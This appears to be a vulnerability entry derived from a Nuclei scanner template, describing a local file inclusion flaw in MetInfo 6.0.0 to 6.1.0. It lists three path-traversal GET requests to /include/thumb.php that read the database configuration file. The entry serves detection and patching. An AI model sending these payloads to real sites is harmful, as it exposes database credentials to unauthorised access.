# Vulnerability: MetInfo <=6.1.0 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`metinfo-lfi.yaml`)

## Description
MetInfo 6.0.0 through 6.1.0 is vulnerable to local file inclusion and allows remote unauthenticated attackers access to locally stored files and their content.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/include/thumb.php?dir=http/.....///.....///config/config_db.php
GET {{BaseURL}}/include/thumb.php?dir=.....///http/.....///config/config_db.php
GET {{BaseURL}}/include/thumb.php?dir=http\\..\\..\\config\\config_db.php
```

